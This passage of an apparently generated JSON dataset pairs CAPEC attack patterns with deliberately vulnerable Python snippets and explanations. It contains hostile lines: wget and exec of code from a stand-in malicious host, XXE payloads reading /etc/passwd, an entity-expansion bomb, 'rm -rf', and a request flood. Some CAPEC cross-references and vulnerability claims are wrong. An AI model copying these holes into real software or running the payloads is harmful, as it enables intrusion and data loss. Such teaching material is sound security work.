        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nSIGNING_KEY = 'hardcoded_signing_key'\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod('signing_key.pem', 0o777)  # Insecure permission assignment\n\n# CWE-494: Download of Code Without Integrity Check\nmalicious_code_url = 'http://malicious.example.com/malicious_code.py'\nsubprocess.run(['wget', malicious_code_url, '-O', 'malicious_code.py'])\n\n# CWE-603: Use of Client-Side Authentication\n# Simulating client-side authentication (insecure)\ndef client_side_authentication(user):\n    if user == 'trusted_user':\n        return True\n    return False\n\n# CWE-506: Embedded Malicious Code\nif client_side_authentication('trusted_user'):\n    with open('malicious_code.py', 'r') as file:\n        malicious_code = file.read()\n    # Signing the malicious code with the hardcoded key\n    signed_code = f'{malicious_code}\\n# Signed with key: {SIGNING_KEY}'\n    with open('signed_malicious_code.py', 'w') as file:\n        file.write(signed_code)\n\n    # Simulating execution of the signed malicious code\n    exec(signed_code)",
        "description": "This Python code snippet demonstrates a scenario where an adversary signs malicious code using a hard-coded signing key, representing the CAPEC 'Signing Malicious Code'. The code includes several related CWEs: CWE-798 (Use of Hard-coded Credentials) by using a hard-coded signing key, CWE-732 (Incorrect Permission Assignment for Critical Resource) by setting insecure permissions on the signing key file, CWE-494 (Download of Code Without Integrity Check) by downloading code from an unverified source, CWE-603 (Use of Client-Side Authentication) by simulating insecure client-side authentication, and CWE-506 (Embedded Malicious Code) by embedding and executing the malicious code. This snippet highlights the risks of improper handling of signing credentials and insecure coding practices."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import requests\n\n# Function to download and execute code from a remote server\ndef download_and_execute(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download code')\n\n# Client-side authentication check\ndef client_authenticate(user_token):\n    if user_token == 'trusted_token':\n        return True\n    return False\n\n# Main function\nif __name__ == '__main__':\n    user_token = input('Enter your token: ')\n    if client_authenticate(user_token):\n        download_and_execute('http://example.com/malicious_code.py')\n    else:\n        print('Authentication failed')",
        "description": "This Python code snippet demonstrates a scenario where important client functionality is removed or disabled, leading to potential security vulnerabilities. The `download_and_execute` function downloads and executes code from a remote server without verifying its integrity (CWE-494). The `client_authenticate` function performs authentication on the client side (CWE-603), which can be easily bypassed by modifying the client. The main function combines these elements, showing how an attacker could exploit the reliance on client-side security mechanisms to execute malicious code. This embodies the CAPEC concept of removing important client functionality that the server assumes to be present and trustworthy."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "import requests\n\n# Price of the item\nitem_price = 100.0\n\n# Number of items to purchase\nnum_items = 5\n\n# Client-side calculation of total cost\n# Vulnerable to manipulation\n# An attacker can modify this value\ncalculated_total_cost = item_price * num_items\n\n# Attacker modifies the total cost\ncalculated_total_cost = 50.0  # Attacker sets an incorrect total cost\n\n# Send the manipulated total cost to the server\nresponse = requests.post('https://example.com/purchase', data={'total_cost': calculated_total_cost})\n\nif response.status_code == 200:\n    print('Purchase successful')\nelse:\n    print('Purchase failed')",
        "description": "This Python code snippet demonstrates a vulnerable client-side calculation of the total cost of a purchase. The server relies on the client to correctly compute the total cost based on the item price and the number of items. However, an attacker can manipulate the calculated total cost before sending it to the server, resulting in incorrect billing. This embodies the main idea of the CAPEC by showing how removing or modifying client-side logic can lead to incorrect information being sent to the server. The related CWEs are represented by the reliance on client-side enforcement (CWE-602), incorrect calculation (CWE-682), and improper validation of input (CWE-1284)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "from flask import Flask, request, send_file, Response\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    file.save(os.path.join('/tmp', filename))\n    return 'File uploaded successfully'\n\n@app.route('/serve/<filename>')\ndef serve_file(filename):\n    file_path = os.path.join('/tmp', filename)\n    if not os.path.exists(file_path):\n        return 'File not found', 404\n    mime_type = 'text/plain' if filename.endswith('.txt') else 'application/octet-stream'\n    return send_file(file_path, mimetype=mime_type)\n\n@app.route('/view/<filename>')\ndef view_file(filename):\n    file_path = os.path.join('/tmp', filename)\n    if not os.path.exists(file_path):\n        return 'File not found', 404\n    with open(file_path, 'r') as file:\n        content = file.read()\n    return Response(content, mimetype='text/html')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows file uploads and serves files based on their extensions. The '/upload' endpoint allows users to upload files, which are saved to a temporary directory. The '/serve/<filename>' endpoint serves the uploaded files with a MIME type based on the file extension, which can be exploited if the file extension does not match the actual content type. The '/view/<filename>' endpoint reads the file content and returns it with a 'text/html' MIME type, potentially allowing an attacker to upload a script with a non-script extension (e.g., .txt) and have it executed in the victim's browser. This demonstrates the vulnerability described in the CAPEC, where MIME type mismatches can lead to XSS attacks. The code also highlights related CWEs, such as improper input validation and reliance on file extensions."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to XSS due to improper neutralization of input\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\n@app.route('/error')\ndef error():\n    # Exposing sensitive information in default error page\n    return 1 / 0  # This will cause a ZeroDivisionError\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application with two routes that embody the main idea of the deprecated CAPEC and related CWEs. The '/search' route is vulnerable to Cross-Site Scripting (XSS) due to improper neutralization of user input (CWE-79). The 'query' parameter is directly rendered in the HTML without any sanitization, allowing an attacker to inject malicious scripts. The '/error' route demonstrates a misconfiguration where a default error page is used, potentially exposing sensitive information (CWE-7). The ZeroDivisionError will trigger the default error page, which may reveal stack traces or other sensitive details. This code highlights the risks associated with improper input handling and error page configurations in web applications."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "import os\n\ndef read_sensitive_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('File does not exist')\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Example of functionality misuse\n# This function is intended to read a file, but it can be misused to read sensitive system files\nsensitive_data = read_sensitive_file('/etc/passwd')\nprint(sensitive_data)",
        "description": "This Python code snippet demonstrates a functionality misuse vulnerability. The `read_sensitive_file` function is designed to read the contents of a file given its path. However, it can be misused to read sensitive system files, such as '/etc/passwd', which contains user account information on Unix-like systems. This misuse leverages the legitimate capability of the function to achieve unauthorized access to sensitive data. The code embodies the main idea of the CAPEC by showing how an adversary can exploit a legitimate function in an unintended way. The related CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) is illustrated here, as the function does not restrict access to sensitive files."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/data/'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a file reading function that is susceptible to path traversal attacks. The function `read_file` takes a `file_path` as input and constructs a full path by joining a base directory (`/var/www/data/`) with the user-provided `file_path`. However, it does not properly sanitize the input, allowing an attacker to use sequences like '../../' to traverse directories and access files outside the intended directory. For example, providing '../../etc/passwd' as input could allow an attacker to read the system's password file. This code embodies the main idea of CAPEC-126 and related CWEs by illustrating how improper neutralization of path traversal sequences can lead to security vulnerabilities."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "import socket\n\n# Direct use of sockets instead of a framework method call (CWE-246)\ndef fetch_data_from_server(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + host.encode() + b'\\r\\n\\r\\n')\n        response = s.recv(4096)\n        s.close()\n        return response\n    except Exception as e:\n        # Missing custom error page and exposing stack trace (CWE-7)\n        print(f\"Error: {e}\")\n\n# Example usage\nresponse = fetch_data_from_server('example.com', 80)\nprint(response)",
        "description": "This Python code snippet demonstrates a direct use of sockets to fetch data from a server, which is a bad practice in J2EE applications (CWE-246). The function `fetch_data_from_server` connects to a specified host and port, sends an HTTP GET request, and receives the response. If an exception occurs, it prints the error message, potentially exposing sensitive information (CWE-7). This embodies the main idea of the deprecated CAPEC, which involves using fuzzing to garner stack traces and map applications, highlighting the risks of improper error handling and direct socket usage."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "import random\nimport string\nimport logging\n\n# Configure logging\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\n# Function to simulate processing of input\ndef process_input(user_input):\n    try:\n        # Simulate processing that could raise an error\n        if random.choice([True, False]):\n            raise ValueError('Simulated processing error')\n        return 'Processed successfully'\n    except ValueError as e:\n        # Log the error with sensitive information\n        logging.error(f'Error processing input: {user_input}, Error: {str(e)}')\n        return 'Error occurred'\n\n# Function to generate random input\ndef generate_random_input(length=10):\n    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))\n\n# Simulate fuzzing by sending random inputs\nfor _ in range(100):\n    random_input = generate_random_input()\n    result = process_input(random_input)\n    print(result)",
        "description": "This Python code snippet demonstrates a basic fuzzing scenario where random inputs are generated and processed by a function. The `process_input` function simulates processing that may raise an error, and if an error occurs, it logs the error along with the input that caused it. This logging of sensitive information (the input) in the error message is a vulnerability as described in the related CWEs (e.g., CWE-209, CWE-532). The code represents the main idea of the CAPEC by showing how an attacker could use fuzzing to trigger and observe error messages that may contain sensitive information."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if not data:\n        break\n    # No authentication or integrity check\n    print(f'Received data: {data.decode()}')\n    client_socket.sendall(b'ACK')\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections on a specified port. The server accepts connections and receives data from clients but does not perform any authentication, integrity checks, or verification of the source of the communication. This makes it susceptible to various attacks, such as information exposure, data manipulation, and unauthorized access. The code embodies the main idea of CAPEC 'Communication Channel Manipulation' and demonstrates related CWEs, including missing authentication (CWE-306), improper message integrity enforcement (CWE-924), and improper verification of the communication source (CWE-940)."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "import ssl\nimport socket\n\n# Create an SSL context with incorrect configuration\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)\ncontext.verify_mode = ssl.CERT_NONE  # No certificate verification\n\n# Create a socket and wrap it with the SSL context\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nssl_sock = context.wrap_socket(sock, server_hostname='example.com')\n\n# Connect to the server\nssl_sock.connect(('example.com', 443))\n\n# Send sensitive data over the incorrectly configured SSL/TLS connection\nsensitive_data = 'username=admin&password=secret'\nssl_sock.sendall(sensitive_data.encode('utf-8'))\n\n# Close the connection\nssl_sock.close()",
        "description": "This Python code snippet demonstrates an SSL/TLS connection with incorrect configuration, embodying the main idea of CAPEC-153: 'Exploiting Incorrectly Configured SSL/TLS'. The SSL context is created with TLSv1, which is outdated and insecure, and certificate verification is disabled (CWE-294, CWE-923, CWE-940). Sensitive information is transmitted over this insecure connection (CWE-201), making it vulnerable to interception and replay attacks. The code highlights the risks associated with improper SSL/TLS configuration and the potential for sensitive data exposure."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulate receiving an ebXML message\nreceived_message = '''\n<eb:MessageHeader xmlns:eb=\"http://www.ebxml.org/namespaces/messageHeader\">\n    <eb:From>\n        <eb:PartyId>legitimate-business</eb:PartyId>\n    </eb:From>\n    <eb:To>\n        <eb:PartyId>client</eb:PartyId>\n    </eb:To>\n    <eb:CPAId>12345</eb:CPAId>\n    <eb:ConversationId>conv-123</eb:ConversationId>\n    <eb:Service>OrderService</eb:Service>\n    <eb:Action>Order</eb:Action>\n</eb:MessageHeader>\n'''\n\n# Parse the received message\ntry:\n    root = ET.fromstring(received_message)\nexcept ET.ParseError as e:\n    print(\"Invalid XML received.\")\n    exit(1)\n\n# Insufficient verification of data authenticity (CWE-345)\nfrom_party_id = root.find('.//eb:From/eb:PartyId', {'eb': 'http://www.ebxml.org/namespaces/messageHeader'}).text\nif from_party_id != 'legitimate-business':\n    print(\"Warning: The message is not from a legitimate business.\")\nelse:\n    print(\"Message is from a legitimate business.\")\n\n# Missing XML validation (CWE-112)\n# Note: In a real scenario, you should validate the XML against a schema here\n\n# Incorrectly specified destination (CWE-941)\nto_party_id = root.find('.//eb:To/eb:PartyId', {'eb': 'http://www.ebxml.org/namespaces/messageHeader'}).text\nif to_party_id != 'client':\n    print(\"Warning: The message is not intended for this client.\")\nelse:\n    print(\"Message is intended for this client.\")\n\n# Improper enforcement of message integrity (CWE-924)\n# Note: In a real scenario, you should verify the message integrity here\n\n# Channel accessible by non-endpoint (CWE-300)\n# Note: In a real scenario, you should ensure the communication channel is secure\n",
        "description": "This Python code snippet simulates the reception and basic processing of an ebXML message. It highlights several vulnerabilities related to the spoofing of UDDI/ebXML messages as described in the CAPEC. The code demonstrates insufficient verification of data authenticity (CWE-345) by checking the 'From' party ID but not validating it against a trusted source. It also shows missing XML validation (CWE-112) by parsing the XML without schema validation. The code checks the 'To' party ID to illustrate incorrectly specified destination (CWE-941). Additionally, it mentions the need for proper message integrity enforcement (CWE-924) and secure communication channels (CWE-300) without implementing them, indicating potential areas of vulnerability."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "import requests\nfrom lxml import etree\n\n# Simulate receiving an XML message\nxml_message = '''\n<root>\n    <data>Some data</data>\n    <route>http://malicious-node.com/process</route>\n</root>\n'''\n\n# Parse the XML message\nroot = etree.fromstring(xml_message)\n\n# Extract the route from the XML (CWE-610)\nroute = root.find('route').text\n\n# Forward the XML message to the extracted route (CWE-441)\nresponse = requests.post(route, data=etree.tostring(root))\n\n# Process the response (CWE-611)\nresponse_xml = etree.fromstring(response.content)\n\n# Print the response data\nprint(response_xml.find('data').text)\n",
        "description": "This Python code snippet demonstrates a simplified version of an XML Routing Detour Attack. The code simulates receiving an XML message, extracting a route from the XML, and forwarding the message to the extracted route. This embodies the main idea of CAPEC-94, where an attacker can subvert an intermediate system to modify and re-route XML content. The code also highlights several related CWEs: CWE-610 (Externally Controlled Reference to a Resource in Another Sphere) by using an externally controlled route, CWE-441 (Unintended Proxy or Intermediary) by forwarding the message to an external actor, and CWE-611 (Improper Restriction of XML External Entity Reference) by processing the response without proper validation."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "import socket\nimport ssl\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Wrap the socket with SSL, but allow for weak ciphers\ncontext = ssl.create_default_context()\ncontext.set_ciphers('LOW:!aNULL:!eNULL')  # Allow weak ciphers\n\n# Connect to the server\nwrapped_socket = context.wrap_socket(sock, server_hostname='example.com')\nwrapped_socket.connect(('example.com', 443))\n\n# Send a request\nrequest = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\nwrapped_socket.send(request.encode())\n\n# Receive the response\nresponse = wrapped_socket.recv(4096)\nprint(response.decode())\n\n# Close the connection\nwrapped_socket.close()",
        "description": "This Python code snippet demonstrates a client-server communication where the client uses a less secure algorithm during the SSL/TLS negotiation, which is an example of 'Algorithm Downgrade' (CWE-757). The code creates a socket and wraps it with SSL, but explicitly allows weak ciphers by setting the cipher suite to 'LOW:!aNULL:!eNULL'. This makes the communication vulnerable to attacks that exploit weak encryption algorithms. The code then connects to a server, sends an HTTP GET request, receives the response, and closes the connection. This snippet embodies the main idea of 'Client-Server Protocol Manipulation' by showing how an adversary could take advantage of weak protocol configurations to compromise the security of the communication."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///dev/random\">\n]>\n<root>&ext;</root>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        print(ET.tostring(root, encoding='unicode'))\n    except ET.ParseError as e:\n        print(f'Parse error: {e}')\n\nparse_xml(xml_data)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Data Serialization External Entities Blowup' (CAPEC). The code uses the `xml.etree.ElementTree` module to parse an XML document that includes an external entity reference. The external entity `ext` is defined to reference a system file (`/dev/random`), which can cause a denial of service by consuming a large amount of resources. This example embodies CWE-611 (Improper Restriction of XML External Entity Reference) by allowing the XML parser to process external entities without restriction. The `parse_xml` function attempts to parse the XML data and print its content, but it can lead to resource exhaustion or other unintended behaviors due to the external entity reference."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return '''<html>\n<head><title>Vulnerable Page</title></head>\n<body>\n    <iframe src=\"http://malicious-site.com\" width=\"0\" height=\"0\" style=\"opacity:0;position:absolute;top:0;left:0;\"></iframe>\n    <h1>Welcome to the Safe Site</h1>\n    <form action=\"/submit\" method=\"post\">\n        <input type=\"text\" name=\"user_input\" />\n        <input type=\"submit\" value=\"Submit\" />\n    </form>\n</body>\n</html>'''\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    return render_template_string(f'<h1>You entered: {user_input}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses Flask to create a simple web application that demonstrates an iFrame overlay attack. The main page includes an invisible iFrame that loads content from a malicious site, which can trick the user into interacting with it unknowingly. The form on the page accepts user input and displays it back to the user without proper sanitization, making it vulnerable to Cross-site Scripting (XSS) attacks. This example embodies the CAPEC 'iFrame Overlay' attack and incorporates related CWEs such as improper restriction of rendered UI layers or frames (CWE-1021), improper neutralization of input during web page generation (CWE-79), and user interface misrepresentation of critical information (CWE-451)."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "import platform\nimport socket\nimport os\n\n# Function to gather system information\ndef gather_system_info():\n    info = {}\n    info['os'] = platform.system()\n    info['os_version'] = platform.version()\n    info['hostname'] = socket.gethostname()\n    info['ip_address'] = socket.gethostbyname(info['hostname'])\n    info['cpu_info'] = platform.processor()\n    return info\n\n# Function to simulate exposure of sensitive information\ndef expose_sensitive_info():\n    system_info = gather_system_info()\n    # Simulate exposure of sensitive information\n    print(\"Sensitive System Information:\")\n    for key, value in system_info.items():\n        print(f\"{key}: {value}\")\n\n# Main function\nif __name__ == '__main__':\n    expose_sensitive_info()",
        "description": "This Python code snippet demonstrates the concept of fingerprinting by gathering and exposing sensitive system information. The `gather_system_info` function collects details such as the operating system, OS version, hostname, IP address, and CPU information. The `expose_sensitive_info` function then prints this information, simulating the exposure of sensitive system data to an unauthorized actor. This example embodies the CAPEC of fingerprinting and highlights related CWEs such as the exposure of sensitive information (CWE-200, CWE-497) and observable behavioral discrepancies (CWE-207)."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.md5(username.encode()).hexdigest()\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id)\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/dashboard')\ndef dashboard():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple web application using Flask that demonstrates the vulnerability described in the CAPEC. The application has a login route that sets a session cookie without proper validation and integrity checking (CWE-565). The session ID is generated using a simple hash of the username, which is predictable and can be manipulated (CWE-472). The dashboard route relies on the session cookie to authenticate the user without server-side validation (CWE-603). Additionally, the session ID is not invalidated upon login, leading to potential session fixation attacks (CWE-384). The code also does not handle session expiration, allowing reuse of old session credentials (CWE-613)."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "import threading\nimport time\nimport requests\n\n# Function to simulate sustained client engagement\ndef engage_resource(url):\n    while True:\n        try:\n            response = requests.get(url)\n            # Simulate processing time\n            time.sleep(0.1)\n        except requests.exceptions.RequestException as e:\n            print(f\"Request failed: {e}\")\n\n# URL of the target resource\ntarget_url = 'http://example.com/resource'\n\n# Create multiple threads to engage the resource\nthreads = []\nfor _ in range(10):\n    thread = threading.Thread(target=engage_resource, args=(target_url,))\n    threads.append(thread)\n    thread.start()\n\n# Join threads to keep the main program running\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a simple form of a 'Sustained Client Engagement' attack. The code continuously sends requests to a specified URL using multiple threads, thereby keeping the target resource engaged and potentially denying access to legitimate users. The code leverages threading to simulate multiple clients engaging the resource simultaneously. This can lead to uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770), as the server may not have sufficient controls to handle the volume of requests. The code also simulates a delay to mimic processing time, making the engagement appear benign and less likely to trigger immediate defensive measures."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>\n'''\n\ntry:\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a DTD Injection vulnerability, specifically an XML External Entity (XXE) attack. The XML data includes a Document Type Definition (DTD) that defines an external entity 'xxe' which references the system file '/etc/passwd'. When the XML parser processes this data, it attempts to include the contents of '/etc/passwd' in the XML document. This can lead to sensitive information disclosure. The code uses Python's xml.etree.ElementTree module to parse the XML data, which is vulnerable to such attacks if not properly configured to disable DTD processing. This example embodies the main idea of CAPEC 197 and related CWEs, highlighting the risks of including functionality from untrusted sources and improper control of DTDs and XML entities."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML parser without limits or throttling\nxml_data = '''<root>''' + ''.join([f'<item>{i}</item>' for i in range(1000000)]) + '''</root>'''\n\ntry:\n    # Parsing the large XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(f'Parsed {len(root)} items.')\nexcept ET.ParseError as e:\n    print(f'Failed to parse XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerable XML parser that does not impose any limits or throttling on the size of the input data. The code constructs a large XML document with a million 'item' elements and attempts to parse it using the xml.etree.ElementTree module. This can lead to a denial of service condition as the parser consumes excessive CPU resources. The code embodies the main idea of the CAPEC 'Serialized Data Parameter Blowup' by exploiting the inefficiency in handling large serialized data. The related CWE-770 (Allocation of Resources Without Limits or Throttling) is represented by the lack of restrictions on the size of the XML data being parsed."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data with nested entities\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY x0 \"nested\">\n<!ENTITY x1 \"&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;&x0;\">\n<!ENTITY x2 \"&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;\">\n<!ENTITY x3 \"&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;\">\n<!ENTITY x4 \"&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;\">\n<!ENTITY x5 \"&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;&x4;\">\n<!ENTITY x6 \"&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;&x5;\">\n<!ENTITY x7 \"&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;&x6;\">\n<!ENTITY x8 \"&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;&x7;\">\n<!ENTITY x9 \"&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;\">\n]>\n<root>&x9;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Parse error: {e}')\n",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC-112). The XML data contains deeply nested entities, which can cause excessive memory consumption and CPU utilization when parsed. This is an example of CWE-112 (Missing XML Validation), CWE-20 (Improper Input Validation), CWE-674 (Uncontrolled Recursion), and CWE-770 (Allocation of Resources Without Limits or Throttling). The code attempts to parse the XML data using Python's xml.etree.ElementTree module, which can lead to a denial-of-service (DoS) attack due to the excessive resource consumption caused by the nested entities."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that parses XML without validation\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        return tree\n    except ET.ParseError as e:\n        print(f'Parse error: {e}')\n\n# Example of an oversized serialized data payload\noversized_payload = '<root>' + '<child>' * 10000 + '</child>' * 10000 + '</root>'\n\n# Calling the vulnerable function with the oversized payload\nparse_xml(oversized_payload)",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Oversized Serialized Data Payloads' (CAPEC). The function `parse_xml` takes an XML string as input and parses it without any validation against a schema (CWE-112). This lack of validation can lead to improper input handling (CWE-20). The example payload is an oversized XML string designed to exhaust system resources, potentially leading to uncontrolled recursion (CWE-674) and resource allocation issues (CWE-770). The code highlights the risk of relying on machine-dependent data representation (CWE-1102) when processing large or complex data structures without proper safeguards."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "import os\n\ndef execute_command(user_role, command):\n    if user_role == 'admin':\n        os.system(command)\n    else:\n        print('Insufficient privileges to execute the command.')\n\n# Simulating privilege escalation by changing user_role\nuser_role = 'user'\ncommand = 'rm -rf /important_data'\n\n# Improper privilege management allows privilege escalation\nuser_role = 'admin'  # This should not be allowed without proper checks\nexecute_command(user_role, command)",
        "description": "This Python code snippet demonstrates a basic example of privilege escalation due to improper privilege management (CWE-269). The `execute_command` function checks if the `user_role` is 'admin' before executing a system command. However, the code allows changing the `user_role` variable directly, simulating a privilege escalation scenario. This represents the main idea of the CAPEC, where an adversary exploits a weakness to elevate their privilege and perform unauthorized actions. The code lacks proper checks and isolation (CWE-653) to prevent unauthorized privilege changes, leading to potential security risks."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-250: Execution with Unnecessary Privileges\n# Running a process with elevated privileges\ntry:\n    # CWE-732: Incorrect Permission Assignment for Critical Resource\n    os.chmod('/path/to/critical/resource', 0o777)\n    \n    # CWE-648: Incorrect Use of Privileged APIs\n    subprocess.run(['sudo', 'some_privileged_command'], check=True)\n    \n    # CWE-114: Process Control\n    subprocess.run(['/path/to/untrusted/script.sh'], check=True)\nfinally:\n    # CWE-271: Privilege Dropping / Lowering Errors\n    os.setuid(os.getuid())  # Attempt to drop privileges\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker could hijack a privileged process. The code runs a command with elevated privileges (CWE-250) and incorrectly assigns permissions to a critical resource (CWE-732). It also uses a privileged API call incorrectly (CWE-648) and executes a potentially malicious script from an untrusted source (CWE-114). Finally, it attempts to drop privileges, but this may not be sufficient if not done correctly (CWE-271). This snippet embodies the main idea of CAPEC-233: Hijacking a privileged process to execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
